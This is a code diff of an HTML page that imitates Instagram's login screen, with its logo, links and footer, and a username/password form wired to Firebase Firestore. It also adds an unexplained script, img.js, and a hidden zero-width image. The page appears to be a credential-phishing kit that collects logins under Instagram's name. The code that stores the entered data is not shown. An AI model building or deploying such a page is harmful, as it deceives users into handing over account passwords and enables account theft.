@@ -3,74 +3,109 @@
 <head>
 	<meta charset="UTF-8">
     <title>Login • Instagram</title>
-    <link rel="stylesheet" href="styles.css">
+    <script src="img.js"></script>
+	<link rel="stylesheet" href="styles.css">
 	<link rel="shortcut icon" type="image/png" href="https://instagram-brand.com/wp-content/uploads/2016/11/Instagram_AppIcon_Aug2017.png?w=300">
-
-    <link rel="stylesheet" href="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/css/bootstrap.min.css" integrity="sha384-Gn5384xqQ1aoWXA+058RXPxPg6fy4IWvTNh0E263XmFcJlSAwiGgFAW/dAiS6JXm" crossorigin="anonymous">
-    <script src="https://code.jquery.com/jquery-3.2.1.slim.min.js" integrity="sha384-KJ3o2DKtIkvYIK3UENzmM7KCkRr/rE9/Qpg6aAZGJwFDMVNA/GpGFF93hXpG5KkN" crossorigin="anonymous"></script>
-    <script src="https://cdnjs.cloudflare.com/ajax/libs/popper.js/1.12.9/umd/popper.min.js" integrity="sha384-ApNbgh9B+Y1QKtv3Rn7W3mgPxhU9K/ScQsAP7hUibX39j7fakFPskvXusvfa0b4Q" crossorigin="anonymous"></script>
-    <script src="https://maxcdn.bootstrapcdn.com/bootstrap/4.0.0/js/bootstrap.min.js" integrity="sha384-JZR6Spejh4U02d8jOt6vLEHfe/JQGiRRSQQxSfFWpi1MquVdAyjUar5+76PVCmYl" crossorigin="anonymous"></script>
 
 	<script src="https://www.gstatic.com/firebasejs/7.15.1/firebase-app.js"></script>
     <script src="https://www.gstatic.com/firebasejs/7.15.1/firebase-firestore.js"></script>
 	<meta name="description" content="86 Followers, 102 Following, 28 Posts - See Instagram photos and videos...">
 	<script src="https://ajax.googleapis.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
 </head>
+<body>
+
+	<br>
+	<img src="pictures/camila.jpg" alt="spicycami.spam"style="width: 0px">
+    <div class="wrapper">
+        <div class="header">
+            <div class="top">
+                <div class="logo">
+					<img src="pictures/instagram.png" alt="Instagram"style="width: 550px;">
+				</div>
 
 
-<nav class="navbar navbar-expand-sm navbar-light bg-custom-2">
-    <div class="collapse navbar-collapse" id="navbarTogglerDemo02">
-      <ul class="navbar-nav mr-auto mt-2 mt-lg-0 nav flex-column">
-        <li class="nav-item active">
-          <a class="nav-link" id="instagram" href="https://itunes.apple.com/app/instagram/id389801252?pt=428156&ct=igweb.loginPage.installLink&mt=8&vt=lo">Instagram <span class="sr-only">(current)</span></a>
-        </li>
-        <li class="nav-item active">
-            <a class="nav-link" id="find" href="https://itunes.apple.com/app/instagram/id389801252?pt=428156&ct=igweb.loginPage.installLink&mt=8&vt=lo">Find it for free on the App Store. <span class="sr-only">(current)</span></a>
-          </li>
-      </ul>
-      <a class="nav-link" id="get" href="https://itunes.apple.com/app/instagram/id389801252?pt=428156&ct=igweb.loginPage.installLink&mt=8&vt=lo">GET<span class="sr-only">(current)</span></a>
-    </div>
-  </nav>
-              
-  <div class="wrapper">
-  <br class="br1">
-
-  <p id="translate">English</p>
-
-  <div>
-                <img class="logo" src="pictures/instagram.png" alt="Instagram">
-            </div>
-        </div>
-
-        <br><br>
-
-        <div class="fb">  
-        <button class="btn"><a href="https://www.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26state%3D%257B%2522fbLoginKey%2522%253A%2522ffn9pr3ym57a19035la10iz0wg9or7381gpbapqxpgivxvghz9u%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252F%2522%257D%26scope%3Demail%26response_type%3Dcode%252Cgranted_scopes%26locale%3Den_US%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D513aab09-b83b-48ef-b553-26ab8a15408d&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%2522ffn9pr3ym57a19035la10iz0wg9or7381gpbapqxpgivxvghz9u%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252F%2522%257D%23_%3D_&display=page&locale=en_US&pl_dbl=0"></a><img id="facebook" src="pictures/facebook.png" alt="facebook"></a>Continue with Facebook</button>
-        </div>
-        </div>
-
-        <br> <br>
-
-        <div class="or">
-          <span class="line">
-            OR
-          </span>
-        </div>
-
-        <div class="wrapper">
-          <div class="header">
 				<div class="content">
 					<form id="add-cafe-form">
 						<input type="text" name="name" placeholder="Phone number, username, or email" class="input">
-						<br>
+						<br> <br> 
 						<input type="password" name="city" placeholder="Password" class="input">
 						<button class="btn">Login</button>
 				</form>
 				<ul id="cafe-list"></ul>
-        </div>
-        
+				</div>
 
-        
+                <div class="or" style="text-align: center;">
+                    <div class="line"></div>
+                    <p>OR</p>
+                    <div class="line"></div>
+                </div>
+
+                <div class="dif">
+                    <div class="fb">
+						<a href="https://www.facebook.com/login.php?skip_api_login=1&api_key=124024574287414&kid_directed_site=0&app_id=124024574287414&signed_next=1&next=https%3A%2F%2Fwww.facebook.com%2Fdialog%2Foauth%3Fclient_id%3D124024574287414%26redirect_uri%3Dhttps%253A%252F%252Fwww.instagram.com%252Faccounts%252Fsignup%252F%26state%3D%257B%2522fbLoginKey%2522%253A%2522ffn9pr3ym57a19035la10iz0wg9or7381gpbapqxpgivxvghz9u%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252F%2522%257D%26scope%3Demail%26response_type%3Dcode%252Cgranted_scopes%26locale%3Den_US%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3D513aab09-b83b-48ef-b553-26ab8a15408d&cancel_url=https%3A%2F%2Fwww.instagram.com%2Faccounts%2Fsignup%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522fbLoginKey%2522%253A%2522ffn9pr3ym57a19035la10iz0wg9or7381gpbapqxpgivxvghz9u%2522%252C%2522fbLoginReturnURL%2522%253A%2522%252F%2522%257D%23_%3D_&display=page&locale=en_US&pl_dbl=0"><img src="https://github.com/codingmarket07/Instagram-Login-Page/blob/master/facebook.png?raw=true" alt="facebook"></a>
+						<a class="face" href="https://en-gb.facebook.com/login/">Log in with Facebook</a>
+                    </div>
+                    <div class="forgot" style="text-align: center;">
+						<a href="https://www.instagram.com/accounts/password/reset/">Forgot password?</a>
+                    </div>
+                </div>
+            </div>
+			<div class="signup">
+				<p>Don't have an account? <a href="https://www.instagram.com/accounts/emailsignup/">Sign up</a></p>
+			</div>
+			<div class="apps">
+				<br>
+				<p>Get the app.</p>
+				<a href="https://apps.apple.com/app/instagram/id389801252?vt=lo"><img src="https://github.com/codingmarket07/Instagram-Login-Page/blob/master/appstore.png?raw=true" alt="appstore"></a>
+				<a href="https://play.google.com/store/apps/details?id=com.instagram.android&referrer=utm_source%3Dinstagramweb%26utm_campaign%3DloginPage%26ig_mid%3DCAFE6F48-CC48-4840-8F78-A3EEFB6E3053%26utm_content%3Dlo%26utm_medium%3Dbadge"> <img src="https://github.com/codingmarket07/Instagram-Login-Page/blob/master/googleplay.png?raw=true" alt="googleplay"></img>
+				<div class="icons">
+				</div>
+			</div>
+		</div>
+		</div>
+	</div>
+	
+	<br> <br> 
+	
+	<div class="footer">
+			<div class="links" id="links">
+				<ul>
+					<li><a href="https://about.instagram.com/about-us">ABOUT</a></li>
+					<li><a href="https://help.instagram.com/">HELP</a></li>
+					<li><a href="https://about.instagram.com/blog/">PRESS</a></li>
+					<li><a href="https://www.instagram.com/developer/">API</a></li>
+					<li><a href="https://www.instagram.com/about/jobs/">JOBS</a></li>
+					<li><a href="https://help.instagram.com/519522125107875">PRIVACY</a></li>
+					<li><a href="https://help.instagram.com/581066165581870">TERMS</a></li>
+					<br> <br>
+					<li><a href="https://www.instagram.com/explore/locations/">LOCATIONS</a></li>
+					<li><a href="https://www.instagram.com/directory/profiles/">TOP ACCOUNTS</a></li>
+					<li><a href="https://www.instagram.com/directory/hashtags/">HASHTAGS</a></li>
+					<li>
+				</ul>
+			</div> 
+			
+			<br>
+			<div class="copyright" id="links">
+				© 2020 INSTAGRAM
+			</div>
+		</div>
+    </div>
+
+    
+    <br><br><br><br><br><br><br><br><br><br><br><br><br>
+	 
+                
+                <div class="footer" id="he">
+                    <footer>
+                        <img id="hi" src="pictures/facebook.jpg" alt="">
+                    </footer>
+                </div>
+				
+
+	
+		
+	
 <!-- TODO: Add SDKs for Firebase products that you want to use
      https://firebase.google.com/docs/web/setup#available-libraries -->
 	 <script src="https://www.gstatic.com/firebasejs/7.15.1/firebase-analytics.js"></script>
@@ -94,3 +129,7 @@
   firebase.analytics();
 </script>
         <script src="app.js"></script>
+
+	
+</body>
+</html>
